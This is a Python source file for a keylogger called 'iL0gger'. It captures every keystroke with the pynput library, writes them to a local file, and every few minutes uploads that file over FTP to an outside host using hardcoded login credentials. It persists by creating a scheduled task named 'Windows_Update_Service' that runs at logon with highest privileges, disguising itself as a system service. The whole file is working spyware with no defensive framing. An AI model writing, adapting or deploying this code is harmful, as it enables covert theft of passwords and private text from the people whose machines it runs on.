import os
import time
import threading
from pynput import keyboard
from ftplib import FTP

class iL0gger:
    def __init__(self, log_file="file.txt"):
        self.log = "iL0gger has started...\n"
        self.log_file = log_file
        self.reset_log_file()
        self.add_to_task_scheduler()

        upload_thread = threading.Thread(target=self.upload_timer, daemon=True)
        upload_thread.start()

    def upload_timer(self):
        while True:
            time.sleep(295)
            self.upload_log()

    def upload_log(self):
        ftp_host = "ftpupload.net"
        ftp_user = "if0_38641579"
        ftp_pass = "fEuqiolRuqIMn"

        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        new_filename = f"file_{timestamp}.txt"

        try:
            ftp = FTP(ftp_host)
            ftp.login(ftp_user, ftp_pass)
            ftp.cwd("htdocs/uploads")
        
            with open("file.txt", "rb") as file:
                ftp.storbinary(f"STOR {new_filename}", file)

            print(f"File succesfully uploaded -> {new_filename}")
            ftp.quit()

        except Exception as e:
            print(f"FTP error {e}")

    def add_to_task_scheduler(self):
        exe_path = os.path.abspath(__file__)
        task_name = "Windows_Update_Service"

        check_task = os.popen(f'schtasks /query /tn "{task_name}"').read()
        if task_name not in check_task:  
            os.system(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest')

    def reset_log_file(self):
        if os.path.exists(self.log_file):
            os.remove(self.log_file)
        with open(self.log_file, "w") as file:
            file.write(self.log)

    def timer(self):
        while True:
            time.sleep(300)
            self.reset_log_file()

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = f" [{str(key)}] "

        with open(self.log_file, "a") as file:
            file.write(current_key)

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.listener.join()

if __name__ == "__main__":
    il0gger = iL0gger()
    
    reset_thread = threading.Thread(target=il0gger.timer)
    reset_thread.daemon = True
    reset_thread.start()
    
    il0gger.start()
